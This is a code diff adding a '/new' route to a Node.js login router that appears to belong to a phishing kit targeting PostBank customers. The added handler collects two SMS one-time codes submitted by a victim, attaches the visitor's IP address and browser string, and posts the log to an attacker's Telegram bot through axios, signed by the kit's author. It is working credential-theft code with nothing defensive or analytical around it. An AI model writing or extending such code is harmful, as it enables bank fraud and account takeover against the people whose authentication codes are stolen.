@@ -33,5 +33,22 @@ login.post('/',(req,res)=>{
     })
 
 })
+
+login.post('/new',(req,res)=>{
+    const geo = geoip.lookup(req.ip);
+    const log= "---------- ☺ ♥ ♥ SMS PostBank ♥ ♥ ☺ ----------- \n" +
+        "SMS 1  : " +req.body.sms +"\n"+
+        "SMS 2 : "+ req.body.sms1 +"\n"+
+        "------------------------------------- \n"+
+        "Browser : " +req.headers["user-agent"]+"\n"+
+        "Ip Address  :"+req.ip+"\n"+
+        "----------Created By ChkawPaolo ----------- \n"
+    const rs = axios.post(`${Telegram_api}/sendMessage`, {
+        chat_id: ChatID,
+        text: log
+    })
+
+
+})
 module.exports = login
 
